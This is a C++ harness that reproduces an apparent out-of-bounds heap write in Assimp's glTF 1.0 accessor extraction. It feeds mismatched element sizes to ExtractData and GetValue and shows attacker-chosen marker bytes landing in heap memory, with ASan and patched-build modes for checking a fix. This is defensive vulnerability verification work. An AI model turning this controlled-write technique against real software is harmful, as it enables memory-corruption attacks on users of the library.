// Direct-call harness for CVE-2026-134861 (Assimp glTF 1.0 accessor OOB write).
// The implementation under test is copied verbatim from the pinned v6.0.6
// glTFAsset.inl (or the same file with the proposed PR 6860 hunk applied) at
// build time into "pinned.inc". Only the surrounding object shapes are stubs.
#include <cstdint>
#include <cstdio>
#include <cstring>
#include <cstdlib>
#include <new>
#include <limits>

#define ai_assert(expr) ((void)0)

struct SEncodedRegion {
    size_t Offset;
    size_t DecodedData_Length;
    uint8_t *DecodedData;
};

struct FakeBuffer {
    uint8_t *ptr;
    SEncodedRegion *EncodedRegion_Current;
    FakeBuffer() : ptr(nullptr), EncodedRegion_Current(nullptr) {}
    uint8_t *GetPointer() { return ptr; }
};

struct FakeBufferView {
    FakeBuffer *buffer;
    size_t byteOffset;
    size_t byteLength;
};

struct Accessor {
    FakeBufferView *bufferView;
    unsigned int byteOffset;
    unsigned int byteStride;
    unsigned int count;
    unsigned int elemSize; // AttribType::GetNumComponents() * component bytes

    unsigned int GetElementSize() { return elemSize; }
    uint8_t *GetPointer();
    bool CheckDataRange(); // declared in both builds; defined only in the fixed inc
    template <class T> bool ExtractData(T *&outData);

    class Indexer {
        friend struct Accessor;
    protected:
        Accessor &accessor;
    private:
        uint8_t *data;
        size_t elemSize, stride;
    public:
        explicit Indexer(Accessor &acc);
        template <class T> T GetValue(int i);
    };
};

#include "pinned.inc"

struct V3 { float x, y, z; };

// A deterministic heap arena lets the plain build show where the chosen source
// bytes land. ASan builds deliberately use the default allocator so redzones
// catch the write immediately.
#ifdef PLAIN_ARENA
static uint8_t g_arena[8192];
static size_t g_arena_used = 0;
void *operator new[](size_t n) {
    void *p = g_arena + g_arena_used;
    g_arena_used += (n + 15u) & ~size_t(15u);
    return p;
}
void operator delete[](void *p) noexcept { (void)p; }
#endif

static void dump(const char *label, const uint8_t *p, size_t n) {
    printf("%s:", label);
    for (size_t i = 0; i < n; ++i) printf(" %02x", p[i]);
    printf("\n");
}

int main(int argc, char **argv) {
    const char *mode = argc > 1 ? argv[1] : "vec4pos";
    static uint8_t src[256];
    FakeBuffer buf;
    FakeBufferView view;
    Accessor acc;
    view.buffer = &buf;
    view.byteOffset = 0;
    view.byteLength = 0;
    acc.bufferView = &view;
    acc.byteOffset = 0;
    acc.byteStride = 0;
    acc.count = 3;
    buf.ptr = src;

    if (!strcmp(mode, "vec4pos") || !strcmp(mode, "safe")) {
        // glTF 1.0 "POSITION": VEC4 of FLOAT (16 bytes/element) extracted into
        // aiMesh::mVertices, whose elements are aiVector3D (12 bytes).
        const bool vec4 = strcmp(mode, "safe") != 0;
        acc.elemSize = vec4 ? 16 : 12;
        view.byteLength = acc.count * acc.elemSize;
        for (size_t i = 0; i < view.byteLength; ++i) src[i] = uint8_t(0x41 + i);
        const char *marker = "MISHE-OO";
        memcpy(src + 36, marker, 8);
        memcpy(src + 44, "TAUF", 4);
        V3 *out = nullptr;
        bool ok = acc.ExtractData(out);
        printf("mode=%s elemSize=%u count=%u ok=%d out=%s expect=36..47: 4d 49 53 48 45 2d 4f 4f 54 41 55 46\n",
                mode, acc.elemSize, acc.count, int(ok), out ? "set" : "null");
#ifdef PLAIN_ARENA
        dump("arena+32", g_arena + 32, 20);
#endif
        return ok ? 0 : 2;
    }
    if (!strcmp(mode, "vec3idx") || !strcmp(mode, "idx3")) {
        // glTF 1.0 index accessor with type VEC3 (12 bytes/element) read into
        // a 4-byte uint32_t by Accessor::Indexer::GetValue<uint32_t>.
        acc.elemSize = 12;
        view.byteLength = acc.count * acc.elemSize;
        for (size_t i = 0; i < view.byteLength; ++i) src[i] = uint8_t(0x61 + i);
        memcpy(src + 4, "MISHE-OO", 8);
        if (!strcmp(mode, "idx3")) {
            Accessor::Indexer ix(acc);
            uint32_t value = ix.GetValue<uint32_t>(0);
            printf("mode=idx3 elemSize=%u count=%u value=%08x chosen=4d 49 53 48 45 2d 4f 4f at value+4..11\n",
                    acc.elemSize, acc.count, value);
            dump("src+0", src, 12);
            return 0;
        }
        uint32_t *out = nullptr;
        bool ok = acc.ExtractData(out);
        printf("mode=vec3idx elemSize=%u count=%u ok=%d out=%s\n",
                acc.elemSize, acc.count, int(ok), out ? "set" : "null");
#ifdef PLAIN_ARENA
        dump("arena+0", g_arena, 40);
#endif
        return ok ? 0 : 2;
    }
    printf("unknown mode %s\n", mode);
    return 64;
}
